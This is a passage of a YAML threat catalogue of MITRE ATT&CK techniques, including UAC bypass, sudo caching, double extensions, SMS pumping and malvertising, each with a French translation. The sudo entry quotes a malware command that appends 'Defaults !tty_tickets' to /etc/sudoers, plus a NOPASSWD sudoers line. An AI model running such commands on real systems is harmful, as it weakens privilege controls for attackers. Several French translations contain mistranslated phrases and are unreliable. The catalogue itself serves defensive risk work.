          \ : FireEye POSHSPY avril 2017)(Citation : Activit\xE9 ESET Sednit 2017)https://attack.mitre.org/techniques/T1568/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.007
    ref_id: T1036.007
    name: Double File Extension
    description: "Adversaries may abuse a double extension in the filename as a means\
      \ of masquerading the true file type. A file name may include a secondary file\
      \ type extension that may cause only the first extension to be displayed (ex:\
      \ <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>).\
      \ However, the second extension is the true file type that determines how the\
      \ file is opened and executed. The real file extension may be hidden by the\
      \ operating system in the file browser (ex: explorer.exe), as well as in any\
      \ software configured using or similar to the system\u2019s policies.(Citation:\
      \ PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) \n\nAdversaries\
      \ may abuse double extensions to attempt to conceal dangerous file types of\
      \ payloads. A very common usage involves tricking a user into opening what they\
      \ think is a benign file type but is actually executable code. Such files often\
      \ pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001)\
      \ into a user\u2019s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)\
      \ then [User Execution](https://attack.mitre.org/techniques/T1204). For example,\
      \ an executable file attachment named <code>Evil.txt.exe</code> may display\
      \ as <code>Evil.txt</code> to a user. The user may then view it as a benign\
      \ text file and open it, inadvertently executing the hidden malware.(Citation:\
      \ SOCPrime DoubleExtension)\n\nCommon file types, such as text files (.txt,\
      \ .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first\
      \ extension to appear benign. Executable extensions commonly regarded as dangerous,\
      \ such as .exe, .lnk, .hta, and .scr, often appear as the second extension and\
      \ true file type.\nhttps://attack.mitre.org/techniques/T1036/007"
    translations:
      fr:
        name: Double extension de fichier
        description: "Les adversaires peuvent abuser d'une double extension dans le\
          \ nom de fichier pour masquer le v\xE9ritable type de fichier. Un nom de\
          \ fichier peut inclure une extension secondaire de type de fichier qui peut\
          \ faire appara\xEEtre uniquement la premi\xE8re extension (ex : <code>File.txt.exe</code>\
          \ peut s'afficher dans certaines vues simplement comme <code>File.txt</code>).\
          \ Cependant, la seconde extension est le vrai type de fichier qui d\xE9\
          termine comment le fichier est ouvert et ex\xE9cut\xE9. L'extension de fichier\
          \ r\xE9elle peut \xEAtre cach\xE9e par le syst\xE8me d'exploitation dans\
          \ le navigateur de fichiers (ex\_: explorer.exe), ainsi que dans tout logiciel\
          \ configur\xE9 selon ou similaire aux politiques du syst\xE8me. (Citation\
          \ : PCMag DoubleExtension)(Citation : SOCPrime DoubleExtension) \n\nLes\
          \ adversaires peuvent abuser des doubles extensions pour tenter de dissimuler\
          \ des types de fichiers dangereux de charges utiles. Un usage tr\xE8s courant\
          \ consiste \xE0 tromper un utilisateur pour qu'il ouvre ce qu'il pense \xEA\
          tre un type de fichier anodin mais qui est en r\xE9alit\xE9 du code ex\xE9\
          cutable. Ces fichiers se pr\xE9sentent souvent comme des pi\xE8ces jointes\
          \ d'e-mail et permettent \xE0 un adversaire d'obtenir un [Acc\xE8s Initial](https://attack.mitre.org/tactics/TA0001)\
          \ au syst\xE8me d'un utilisateur via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)\
          \ puis [User Execution](https://attack.mitre.org/techniques/T1204). Par\
          \ exemple, une pi\xE8ce jointe ex\xE9cutable nomm\xE9e <code>Evil.txt.exe</code>\
          \ peut s'afficher comme <code>Evil.txt</code> \xE0 un utilisateur. L'utilisateur\
          \ peut alors le voir comme un fichier texte b\xE9nin et l'ouvrir, ex\xE9\
          cutant involontairement le malware cach\xE9. (Citation : SOCPrime DoubleExtension)\n\
          \nLes types de fichiers courants, tels que les fichiers texte (.txt, .doc,\
          \ etc.) et les fichiers image (.jpg, .gif, etc.), sont g\xE9n\xE9ralement\
          \ utilis\xE9s comme premi\xE8re extension \xE0 para\xEEtre anodines. Les\
          \ extensions ex\xE9cutables g\xE9n\xE9ralement consid\xE9r\xE9es comme dangereuses,\
          \ telles que .exe, .lnk, .hta et .scr, apparaissent souvent comme la seconde\
          \ extension et le vrai type de fichier.https\_://attack.mitre.org/techniques/T1036/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1548.002
    ref_id: T1548.002
    name: Bypass User Account Control
    description: 'Adversaries may bypass UAC mechanisms to elevate process privileges
      on system. Windows User Account Control (UAC) allows a program to elevate its
      privileges (tracked as integrity levels ranging from low to high) to perform
      a task under administrator-level permissions, possibly by prompting the user
      for confirmation. The impact to the user ranges from denying the operation under
      high enforcement to allowing the user to perform the action if they are in the
      local administrators group and click through the prompt or allowing them to
      enter an administrator password to complete the action.(Citation: TechNet How
      UAC Works)


      If the UAC protection level of a computer is set to anything but the highest
      level, certain Windows programs can elevate privileges or execute some elevated
      [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects
      without prompting the user through the UAC notification box.(Citation: TechNet
      Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011)
      to load a specifically crafted DLL which loads an auto-elevated [Component Object
      Model](https://attack.mitre.org/techniques/T1559/001) object and performs a
      file operation in a protected directory which would typically require elevated
      access. Malicious software may also be injected into a trusted process to gain
      elevated privileges without prompting a user.(Citation: Davidson Windows)


      Many methods have been discovered to bypass UAC. The Github readme page for
      UACME contains an extensive list of methods(Citation: Github UACMe) that have
      been discovered and implemented, but may not be a comprehensive list of bypasses.
      Additional bypass methods are regularly discovered and some used in the wild,
      such as:


      * <code>eventvwr.exe</code> can auto-elevate and execute a specified binary
      or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)


      Another bypass is possible through some lateral movement techniques if credentials
      for an account with administrator privileges are known, since UAC is a single
      system security mechanism, and the privilege or integrity of a process running
      on one system will be unknown on remote systems and default to high integrity.(Citation:
      SANS UAC Bypass)

      https://attack.mitre.org/techniques/T1548/002'
    translations:
      fr:
        name: "Contourner le contr\xF4le des comptes utilisateurs"
        description: "Les adversaires peuvent contourner les m\xE9canismes UAC pour\
          \ augmenter les privil\xE8ges de processus sur le syst\xE8me. Le Contr\xF4\
          le des comptes utilisateurs Windows (UAC) permet \xE0 un programme d'augmenter\
          \ ses privil\xE8ges (suivis en termes de niveaux d'int\xE9grit\xE9 allant\
          \ de faible \xE0 \xE9lev\xE9) pour effectuer une t\xE2che sous des autorisations\
          \ de niveau administrateur, \xE9ventuellement en sollicitant l'utilisateur\
          \ pour confirmer. L'impact pour l'utilisateur va du refus de l'op\xE9ration\
          \ sous forte application \xE0 la possibilit\xE9 d'effectuer l'action s'il\
          \ est dans le groupe des administrateurs locaux et clique sur l'invite,\
          \ ou encore de lui permettre d'entrer un mot de passe administrateur pour\
          \ effectuer l'action. (Citation : TechNet Comment fonctionne l'UAC)\n\n\
          \ Si le niveau de protection UAC d'un ordinateur est r\xE9gl\xE9 \xE0 autre\
          \ chose que le plus \xE9lev\xE9,  certains programmes Windows peuvent \xE9\
          lever des privil\xE8ges ou ex\xE9cuter certains objets [Component Object\
          \ Model](https://attack.mitre.org/techniques/T1559/001) \xE9lev\xE9s sans\
          \ que l'utilisateur ne soit sollicit\xE9 via la bo\xEEte de notification\
          \ UAC. (Citation : TechNet \xE0 l'int\xE9rieur de l'UAC)(Citation : \xC9\
          l\xE9vation MSDN COM) Un exemple est l'utilisation de [Rundll32](https://attack.mitre.org/techniques/T1218/011)\
          \ pour charger une DLL sp\xE9cifiquement con\xE7ue qui charge un objet [Component\
          \ Object Model](https://attack.mitre.org/techniques/T1559/001) auto-\xE9\
          lev\xE9 et effectue une op\xE9ration de fichier dans un r\xE9pertoire prot\xE9\
          g\xE9 qui n\xE9cessiterait g\xE9n\xE9ralement un acc\xE8s \xE9lev\xE9. Un\
          \ logiciel malveillant peut \xE9galement \xEAtre inject\xE9 dans un processus\
          \ de confiance pour obtenir des privil\xE8ges \xE9lev\xE9s sans que l'utilisateur\
          \ ne le demande. (Citation : Fen\xEAtres Davidson)\n\nDe nombreuses m\xE9\
          thodes ont \xE9t\xE9 d\xE9couvertes pour contourner le UAC. La page readme\
          \ Github pour UACME contient une liste \xE9tendue de m\xE9thodes (Citation\
          \ : Github UACMe) qui ont \xE9t\xE9 d\xE9couvertes et impl\xE9ment\xE9es,\
          \ mais il se peut que ce ne soit pas une liste exhaustive des contournements.\
          \ D'autres m\xE9thodes de contournement sont r\xE9guli\xE8rement d\xE9couvertes\
          \ et certaines utilis\xE9es dans la nature, telles que :\n\n* <code>eventvwr.exe</code>\
          \ peuvent automatiquement \xE9lever et ex\xE9cuter un binaire ou un script\
          \ sp\xE9cifi\xE9.( Citation : enigma0x3 Contournement UAC sans fichiers)(Citation\
          \ : Fortinet Fareit) \n\nUn autre contournement est possible gr\xE2ce \xE0\
          \ certaines techniques de d\xE9placement lat\xE9ral si les identifiants\
          \ d'un compte avec des privil\xE8ges administrateur sont connus, puisque\
          \ l'UAC est un m\xE9canisme de s\xE9curit\xE9 syst\xE8me unique, et que\
          \ le privil\xE8ge ou l'int\xE9grit\xE9 d'un processus fonctionnant sur un\
          \ syst\xE8me sera inconnu sur les syst\xE8mes distants et reviendra \xE0\
          \ une int\xE9grit\xE9 \xE9lev\xE9e par d\xE9faut. Citation : Contournement\
          \ UAC SANS https://attack.mitre.org/techniques/T1548/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1496.003
    ref_id: T1496.003
    name: SMS Pumping
    description: "Adversaries may leverage messaging services for SMS pumping, which\
      \ may impact system and/or hosted service availability.(Citation: Twilio SMS\
      \ Pumping) SMS pumping is a type of telecommunications fraud whereby a threat\
      \ actor first obtains a set of phone numbers from a telecommunications provider,\
      \ then leverages a victim\u2019s messaging infrastructure to send large amounts\
      \ of SMS messages to numbers in that set. By generating SMS traffic to their\
      \ phone number set, a threat actor may earn payments from the telecommunications\
      \ provider.(Citation: Twilio SMS Pumping Fraud)\n\nThreat actors often use publicly\
      \ available web forms, such as one-time password (OTP) or account verification\
      \ fields, in order to generate SMS traffic. These fields may leverage services\
      \ such as Twilio, AWS SNS, and Amazon Cognito in the background.(Citation: Twilio\
      \ SMS Pumping)(Citation: AWS RE:Inforce Threat Detection 2024) In response to\
      \ the large quantity of requests, SMS costs may increase and communication channels\
      \ may become overwhelmed.(Citation: Twilio SMS Pumping)\nhttps://attack.mitre.org/techniques/T1496/003"
    translations:
      fr:
        name: Pompage SMS
        description: "Les adversaires peuvent utiliser les services de messagerie\
          \ pour le pompage SMS, ce qui peut affecter la disponibilit\xE9 du syst\xE8\
          me et/ou des services h\xE9berg\xE9s. (Citation : Pompe SMS Twilio) Le SMS\
          \ pumping est un type de fraude aux t\xE9l\xE9communications par lequel\
          \ un acteur malveillant obtient d'abord un ensemble de num\xE9ros de t\xE9\
          l\xE9phone aupr\xE8s d'un fournisseur de t\xE9l\xE9communications, puis\
          \ exploite l'infrastructure de messagerie de la victime pour envoyer de\
          \ grandes quantit\xE9s de SMS aux num\xE9ros de cet ensemble. En g\xE9n\xE9\
          rant du trafic SMS vers son ensemble de num\xE9ros de t\xE9l\xE9phone, un\
          \ acteur malmenant peut recevoir des paiements du fournisseur de t\xE9l\xE9\
          communications. (Citation : Fraude de Twilio SMS)\n\nLes acteurs malveillants\
          \ utilisent souvent des formulaires web accessibles publiquement, tels que\
          \ le mot de passe \xE0 usage unique (OTP) ou des champs de v\xE9rification\
          \ de compte, afin de g\xE9n\xE9rer du trafic SMS. Ces domaines peuvent exploiter\
          \ des services tels que Twilio, AWS SNS et Amazon Cognito en arri\xE8re-plan.\
          \ (Citation : Pompe SMS Twilio)(Citation : AWS RE\_:Inforce Threat Detection\
          \ 2024) En r\xE9ponse au grand nombre de requ\xEAtes, les co\xFBts des SMS\
          \ peuvent augmenter et les canaux de communication peuvent \xEAtre submerg\xE9\
          s. (Citation : Pompe SMS Twilio https://attack.mitre.org/techniques/T1496/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1016.001
    ref_id: T1016.001
    name: Internet Connection Discovery
    description: 'Adversaries may check for Internet connectivity on compromised systems.
      This may be performed during automated discovery and can be accomplished in
      numerous ways such as using [Ping](https://attack.mitre.org/software/S0097),
      <code>tracert</code>, and GET requests to websites, or performing initial speed
      testing to confirm bandwidth.


      Adversaries may use the results and responses from these requests to determine
      if the system is capable of communicating with their C2 servers before attempting
      to connect to them. The results may also be used to identify routes, redirectors,
      and proxy servers.

      https://attack.mitre.org/techniques/T1016/001'
    translations:
      fr:
        name: "D\xE9couverte de la connexion Internet"
        description: "Les adversaires peuvent v\xE9rifier la connectivit\xE9 Internet\
          \ sur des syst\xE8mes compromis. Cela peut \xEAtre effectu\xE9 lors de la\
          \ d\xE9couverte automatis\xE9e et peut se faire de nombreuses mani\xE8res,\
          \ telles que l'utilisation de requ\xEAtes [Ping](https://attack.mitre.org/software/S0097),\
          \ <code>tracert</code>, et GET vers des sites web, ou la r\xE9alisation\
          \ de tests de vitesse initiaux pour confirmer la bande passante.\n\nLes\
          \ adversaires peuvent utiliser les r\xE9sultats et r\xE9ponses de ces requ\xEA\
          tes pour d\xE9terminer si le syst\xE8me est capable de communiquer avec\
          \ leurs serveurs C2 avant de tenter de s'y connecter. Les r\xE9sultats peuvent\
          \ \xE9galement \xEAtre utilis\xE9s pour identifier des routes, des redirectionnaires\
          \ et des serveurs proxy. https\_://attack.mitre.org/techniques/T1016/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1548.003
    ref_id: T1548.003
    name: Sudo and Sudo Caching
    description: 'Adversaries may perform sudo caching and/or use the sudoers file
      to elevate privileges. Adversaries may do this to execute commands as other
      users or spawn processes with higher privileges.


      Within Linux and MacOS systems, sudo (sometimes referred to as "superuser do")
      allows users to perform commands from terminals with elevated privileges and
      to control who can perform these commands on the system. The <code>sudo</code>
      command "allows a system administrator to delegate authority to give certain
      users (or groups of users) the ability to run some (or all) commands as root
      or another user while providing an audit trail of the commands and their arguments."(Citation:
      sudo man page 2018) Since sudo was made for the system administrator, it has
      some useful configuration features such as a <code>timestamp_timeout</code>,
      which is the amount of time in minutes between instances of <code>sudo</code>
      before it will re-prompt for a password. This is because <code>sudo</code> has
      the ability to cache credentials for a period of time. Sudo creates (or touches)
      a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run
      to determine this timeout. Additionally, there is a <code>tty_tickets</code>
      variable that treats each new tty (terminal session) in isolation. This means
      that, for example, the sudo timeout of one tty will not affect another tty (you
      will have to type the password again).


      The sudoers file, <code>/etc/sudoers</code>, describes which users can run which
      commands and from which terminals. This also describes which commands users
      can run as other users or groups. This provides the principle of least privilege
      such that users are running in their lowest possible permissions for most of
      the time and only elevate to other users or permissions as needed, typically
      by prompting for a password. However, the sudoers file can also specify when
      to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD:
      ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit
      this file though.


      Adversaries can also abuse poor configurations of these mechanisms to escalate
      privileges without needing the user''s password. For example, <code>/var/db/sudo</code>''s
      timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code>
      range. If it does, then malware can execute sudo commands without needing to
      supply the user''s password. Additional, if <code>tty_tickets</code> is disabled,
      adversaries can do this from any tty for that user.


      In the wild, malware has disabled <code>tty_tickets</code> to potentially make
      scripting easier by issuing <code>echo \''Defaults !tty_tickets\'' >> /etc/sudoers</code>.(Citation:
      cybereason osx proton) In order for this change to be reflected, the malware
      also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file
      has <code>tty_tickets</code> enabled by default.

      https://attack.mitre.org/techniques/T1548/003'
    translations:
      fr:
        name: Sudo et Sudo Caching
        description: "Les adversaires peuvent effectuer un cache sudo et/ou utiliser\
          \ le fichier sudoer pour augmenter les privil\xE8ges. Les adversaires peuvent\
          \ faire cela pour ex\xE9cuter des commandes en nombre d'autres utilisateurs\
          \ ou faire appara\xEEtre des processus avec des privil\xE8ges plus \xE9\
          lev\xE9s.\n\nDans les syst\xE8mes Linux et MacOS, sudo (parfois appel\xE9\
          \ \xAB superuser do \xBB) permet aux utilisateurs d'ex\xE9cuter des commandes\
          \ depuis des terminaux avec des privil\xE8ges \xE9lev\xE9s et de contr\xF4\
          ler qui peut ex\xE9cuter ces commandes sur le syst\xE8me. La commande <code>sudo</code>\
          \ \xAB permet \xE0 un administrateur syst\xE8me de d\xE9l\xE9guer l'autorit\xE9\
          \ de donner \xE0 certains utilisateurs (ou groupes d'utilisateurs) la possibilit\xE9\
          \ d'ex\xE9cuter certaines (ou toutes) commandes en tant que root ou un autre\
          \ utilisateur tout en fournissant une trace d'audit des commandes et de\
          \ leurs arguments. \xBB (Citation : page sudo man 2018) Puisque Sudo a \xE9\
          t\xE9 con\xE7u pour l'administrateur syst\xE8me, il poss\xE8de certaines\
          \ fonctionnalit\xE9s de configuration utiles telles qu'un <code>timestamp_timeout</code>,\
          \ qui correspond au temps en minutes entre les instances de <code>sudo</code>\
          \ avant qu'il ne redemande un mot de passe. Cela s'explique par le fait\
          \ que <code>sudo</code> a la capacit\xE9 de mettre en cache les identifiants\
          \ pendant une certaine p\xE9riode. Sudo cr\xE9e (ou touche) un fichier \xE0\
          \ <code>/var/db/sudo</code> avec un horodatage indiquant la derni\xE8re\
          \ ex\xE9cution de sudo pour d\xE9terminer ce d\xE9lai d'attente. De plus,\
          \ il existe une variable <code>tty_tickets</code> qui traite chaque nouvelle\
          \ session TTY (session terminale) isol\xE9ment. Cela signifie que, par exemple,\
          \ le d\xE9lai d'attente d'un TTY n'affectera pas un autre TTY (vous devrez\
          \ taper le mot de passe \xE0 nouveau).\n\nLe fichier sudoers, <code>/etc/sudoers</code>,\
          \ d\xE9crit quels utilisateurs peuvent ex\xE9cuter quelles commandes et\
          \ depuis quels terminaux. Cela d\xE9crit \xE9galement quelles commandes\
          \ les utilisateurs peuvent ex\xE9cuter en tant qu'autres utilisateurs ou\
          \ groupes. Cela \xE9tablit le principe du moindre privil\xE8ge, de sorte\
          \ que les utilisateurs fonctionnent avec leurs permissions les plus basses\
          \ possibles la plupart du temps et ne passent \xE0 d'autres utilisateurs\
          \ ou aux permissions que si n\xE9cessaire, g\xE9n\xE9ralement en demandant\
          \ un mot de passe. Cependant, le fichier sudoers peut aussi sp\xE9cifier\
          \ quand il ne faut pas demander de mots de passe aux utilisateurs avec une\
          \ ligne comme <code>user1 ALL=(ALL) NOPASSWD\_: ALL</code>. (Citation :\
          \ OSX. Dok Malware) Des privil\xE8ges \xE9lev\xE9s sont cependant n\xE9\
          cessaires pour modifier ce fichier.\n\nLes adversaires peuvent \xE9galement\
          \ abuser de mauvaises configurations de ces m\xE9canismes pour augmenter\
          \ les privil\xE8ges sans avoir besoin du mot de passe de l'utilisateur.\
          \ Par exemple, l'horodatage de < >/var/db/sudo</code> peut \xEAtre surveill\xE9\
          \ pour voir s'il se situe dans la plage <code>timestamp_timeout</code>.\
          \ Si c'est le cas, alors le malware peut ex\xE9cuter des commandes sudo\
          \ sans avoir besoin de fournir le mot de passe de l'utilisateur. De plus,\
          \ si <code>tty_tickets</code> est d\xE9sactiv\xE9, les adversaires peuvent\
          \ le faire depuis n'importe quel TTY pour cet utilisateur.\n\nDans la nature,\
          \ les malwares ont d\xE9sactiv\xE9 <code>tty_tickets</code> pour potentiellement\
          \ faciliter le scripting en diffusant des <code>echo \\'Defaults !tty_tickets\\\
          ' >> /etc/sudoers</code>. (Citation : cybereason osx proton) Pour que ce\
          \ changement soit pris en compte, le malware a \xE9galement \xE9mis <code>killall\
          \ Terminal</code>. Depuis macOS Sierra, le fichier sudoers a <code>tty_tickets</code>\
          \ activ\xE9 par d\xE9faut.https\_://attack.mitre.org/techniques/T1548/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1560.003
    ref_id: T1560.003
    name: Archive via Custom Method
    description: 'An adversary may compress or encrypt data that is collected prior
      to exfiltration using a custom method. Adversaries may choose to use custom
      archival methods, such as encryption with XOR or stream ciphers implemented
      with no external library or utility references. Custom implementations of well-known
      compression algorithms have also been used.(Citation: ESET Sednit Part 2)

      https://attack.mitre.org/techniques/T1560/003'
    translations:
      fr:
        name: "Archive via une m\xE9thode personnalis\xE9e"
        description: "Un adversaire peut compresser ou chiffrer les donn\xE9es collect\xE9\
          es avant l'exfiltration en utilisant une m\xE9thode personnalis\xE9e. Les\
          \ adversaires peuvent choisir d'utiliser des m\xE9thodes d'archivage personnalis\xE9\
          es, telles que le chiffrement avec XOR ou des chiffrements de flux impl\xE9\
          ment\xE9s sans biblioth\xE8que externe ni r\xE9f\xE9rences utilitaires.\
          \ Des impl\xE9mentations personnalis\xE9es d'algorithmes de compression\
          \ bien connus ont \xE9galement \xE9t\xE9 utilis\xE9es. (Citation : ESET\
          \ Sednit Partie 2)https://attack.mitre.org/techniques/T1560/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1578
    ref_id: T1578
    name: Modify Cloud Compute Infrastructure
    description: 'An adversary may attempt to modify a cloud account''s compute service
      infrastructure to evade defenses. A modification to the compute service infrastructure
      can include the creation, deletion, or modification of one or more components
      such as compute instances, virtual machines, and snapshots.


      Permissions gained from the modification of infrastructure components may bypass
      restrictions that prevent access to existing infrastructure. Modifying infrastructure
      components may also allow an adversary to evade detection and remove evidence
      of their presence.(Citation: Mandiant M-Trends 2020)

      https://attack.mitre.org/techniques/T1578'
    translations:
      fr:
        name: Modifier l'infrastructure de calcul cloud
        description: "Un adversaire peut tenter de modifier l'infrastructure des services\
          \ de calcul d'un compte cloud pour contourner les d\xE9fenses. Une modification\
          \ de l'infrastructure des services de calcul peut inclure la cr\xE9ation,\
          \ la suppression ou la modification d'un ou plusieurs composants tels que\
          \ des instances de calcul, des machines virtuelles et des instantan\xE9\
          s.\n\nLes autorisations obtenues lors de la modification des composants\
          \ d'infrastructure peuvent contourner les restrictions qui emp\xEAchent\
          \ l'acc\xE8s \xE0 l'infrastructure existante. Modifier les composants de\
          \ l'infrastructure peut \xE9galement permettre \xE0 un adversaire d'\xE9\
          chapper \xE0 la d\xE9tection et d'\xE9liminer les preuves de sa pr\xE9sence.\
          \ (Citation : Mandiant M-Trends 2020)https://attack.mitre.org/techniques/T1578"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.008
    ref_id: T1584.008
    name: Network Devices
    description: 'Adversaries may compromise third-party network devices that can
      be used during targeting. Network devices, such as small office/home office
      (SOHO) routers, may be compromised where the adversary''s ultimate goal is not
      [Initial Access](https://attack.mitre.org/tactics/TA0001) to that environment,
      but rather to leverage these devices to support additional targeting.


      Once an adversary has control, compromised network devices can be used to launch
      additional operations, such as hosting payloads for [Phishing](https://attack.mitre.org/techniques/T1566)
      campaigns (i.e., [Link Target](https://attack.mitre.org/techniques/T1608/005))
      or enabling the required access to execute [Content Injection](https://attack.mitre.org/techniques/T1659)
      operations. Adversaries may also be able to harvest reusable credentials (i.e.,
      [Valid Accounts](https://attack.mitre.org/techniques/T1078)) from compromised
      network devices.


      Adversaries often target Internet-facing edge devices and related network appliances
      that specifically do not support robust host-based defenses.(Citation: Mandiant
      Fortinet Zero Day)(Citation: Wired Russia Cyberwar)


      Compromised network devices may be used to support subsequent [Command and Control](https://attack.mitre.org/tactics/TA0011)
      activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665)
      through an established [Proxy](https://attack.mitre.org/techniques/T1090) and/or
      [Botnet](https://attack.mitre.org/techniques/T1584/005) network.(Citation: Justice
      GRU 2024)

      https://attack.mitre.org/techniques/T1584/008'
    translations:
      fr:
        name: "Dispositifs r\xE9seau"
        description: "Les adversaires peuvent compromettre des dispositifs r\xE9seau\
          \ tiers pouvant \xEAtre utilis\xE9s lors du ciblage. Les dispositifs r\xE9\
          seau, tels que les routeurs de petit bureau/home office (SOHO), peuvent\
          \ \xEAtre compromis lorsque l'objectif ultime de l'adversaire n'est pas\
          \ l'[Acc\xE8s Initial](https://attack.mitre.org/tactics/TA0001) \xE0 cet\
          \ environnement, mais plut\xF4t de tirer parti de ces appareils pour supporter\
          \ un ciblage suppl\xE9mentaire.\n\nUne fois qu'un adversaire a le contr\xF4\
          le, les dispositifs r\xE9seau compromis peuvent \xEAtre utilis\xE9s pour\
          \ lancer des op\xE9rations suppl\xE9mentaires, comme h\xE9berger des charges\
          \ utiles pour des campagnes de [Phishing](https://attack.mitre.org/techniques/T1566)\
          \ (c'est-\xE0-dire [Cible de lien](https://attack.mitre.org/techniques/T1608/005))\
          \ ou permettre l'acc\xE8s n\xE9cessaire pour ex\xE9cuter des op\xE9rations\
          \ d'[Injection de contenu](https://attack.mitre.org/techniques/T1659). Les\
          \ adversaires peuvent \xE9galement \xEAtre capables de r\xE9colter des identifiants\
          \ r\xE9utilisables (c'est-\xE0-dire [Comptes valides](https://attack.mitre.org/techniques/T1078))\
          \ \xE0 partir de dispositifs r\xE9seau compromis.\n\nLes adversaires ciblent\
          \ souvent des dispositifs de p\xE9riph\xE9rie connect\xE9s \xE0 Internet\
          \ et des appareils r\xE9seau associ\xE9s qui ne supportent sp\xE9cifiquement\
          \ pas de d\xE9fenses robustes bas\xE9es sur l'h\xF4te. (Citation : Mandiant\
          \ Fortinet Zero Day)(Citation : Cyberguerre de la Russie c\xE2bl\xE9e)\n\
          \nLes dispositifs r\xE9seau compromis peuvent \xEAtre utilis\xE9s pour supporter\
          \ les activit\xE9s ult\xE9rieures de [Commande et Contr\xF4le](https://attack.mitre.org/tactics/TA0011),\
          \ telles que [Masquer l'infrastructure](https://attack.mitre.org/techniques/T1665)\
          \ via un r\xE9seau \xE9tabli [Proxy](https://attack.mitre.org/techniques/T1090)\
          \ et/ou [Botnet](https://attack.mitre.org/techniques/T1584/005). (Citation\
          \ : Juge GRU 2024)https://attack.mitre.org/techniques/T1584/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.008
    ref_id: T1583.008
    name: Malvertising
    description: "Adversaries may purchase online advertisements that can be abused\
      \ to distribute malware to victims. Ads can be purchased to plant as well as\
      \ favorably position artifacts in specific locations  online, such as prominently\
      \ placed within search engine results. These ads may make it more difficult\
      \ for users to distinguish between actual search results and advertisements.(Citation:\
      \ spamhaus-malvertising) Purchased ads may also target specific audiences using\
      \ the advertising network\u2019s capabilities, potentially further taking advantage\
      \ of the trust inherently given to search engines and popular websites. \n\n\
      Adversaries may purchase ads and other resources to help distribute artifacts\
      \ containing malicious code to victims. Purchased ads may attempt to impersonate\
      \ or spoof well-known brands. For example, these spoofed ads may trick victims\
      \ into clicking the ad which could then send them to a malicious domain that\
      \ may be a clone of official websites containing trojanized versions of the\
      \ advertised software.(Citation: Masquerads-Guardio)(Citation: FBI-search) Adversary\u2019\
      s efforts to create malicious domains and purchase advertisements may also be\
      \ automated at scale to better resist cleanup efforts.(Citation: sentinelone-malvertising)\
      \ \n\nMalvertising may be used to support [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)\
      \ and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), potentially\
      \ requiring limited interaction from the user if the ad contains code/exploits\
      \ that infect the target system's web browser.(Citation: BBC-malvertising)\n\
      \nAdversaries may also employ several techniques to evade detection by the advertising\
      \ network. For example, adversaries may dynamically route ad clicks to send\
      \ automated crawler/policy enforcer traffic to benign sites while validating\
      \ potential targets then sending victims referred from real ad clicks to malicious\
      \ pages. This infection vector may therefore remain hidden from the ad network\
      \ as well as any visitor not reaching the malicious sites with a valid identifier\
      \ from clicking on the advertisement.(Citation: Masquerads-Guardio) Other tricks,\
      \ such as intentional typos to avoid brand reputation monitoring, may also be\
      \ used to evade automated detection.(Citation: spamhaus-malvertising)\nhttps://attack.mitre.org/techniques/T1583/008"
    translations:
      fr:
        name: Malvertising
        description: "Les adversaires peuvent acheter des publicit\xE9s en ligne qui\
          \ peuvent \xEAtre abus\xE9es pour distribuer des malwares aux victimes.\
          \ Les publicit\xE9s peuvent \xEAtre achet\xE9es pour planter et positionner\
          \ favorablement des artefacts dans des endroits sp\xE9cifiques en ligne,\
          \ comme les mises en avant dans les r\xE9sultats des moteurs de recherche.\
          \ Ces publicit\xE9s peuvent rendre plus difficile pour les utilisateurs\
          \ de distinguer les r\xE9sultats de recherche r\xE9els des publicit\xE9\
          s. (Citation : spamhaus-malvertising) Les publicit\xE9s achet\xE9es peuvent\
          \ \xE9galement cibler des audiences sp\xE9cifiques gr\xE2ce aux capacit\xE9\
          s du r\xE9seau publicitaire, tirant ainsi davantage parti de la confiance\
          \ qui est inn\xE9e aux moteurs de recherche et aux sites web populaires.\
          \ \n\nLes adversaires peuvent acheter des publicit\xE9s et d'autres ressources\
          \ pour aider \xE0 distribuer des artefacts contenant du code malveillant\
          \ aux victimes. Les publicit\xE9s achet\xE9es peuvent tenter d'usurper l'identit\xE9\
          \ ou de parodier des marques connues. Par exemple, ces publicit\xE9s usurp\xE9\
          es peuvent tromper les victimes en les poussant \xE0 cliquer sur l'annonce,\
          \ ce qui pourrait les envoyer vers un domaine malveillant qui pourrait \xEA\
          tre un clone de sites officiels contenant des versions trojanis\xE9es du\
          \ logiciel annonc\xE9. (Citation : Masquerads-Guardio)(Citation : FBI-search)\
          \ Les efforts de l'adversaire pour cr\xE9er des domaines malveillants et\
          \ acheter des publicit\xE9s peuvent \xE9galement \xEAtre automatis\xE9s\
          \ \xE0 grande \xE9chelle afin de mieux r\xE9sister aux efforts de nettoyage.\
          \ (Citation : sentinelone-malvertising) \n\nLe malvertising peut \xEAtre\
          \ utilis\xE9 pour supporter [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)\
          \ et [Drive-by-Compromise](https://attack.mitre.org/techniques/T1189), n\xE9\
          cessitant potentiellement une interaction limit\xE9e de la part de l'utilisateur\
          \ si la publicit\xE9 contient du code/des exploits infectant le navigateur\
          \ web du syst\xE8me cible. (Citation : BBC-malvertising)\n\nLes adversaires\
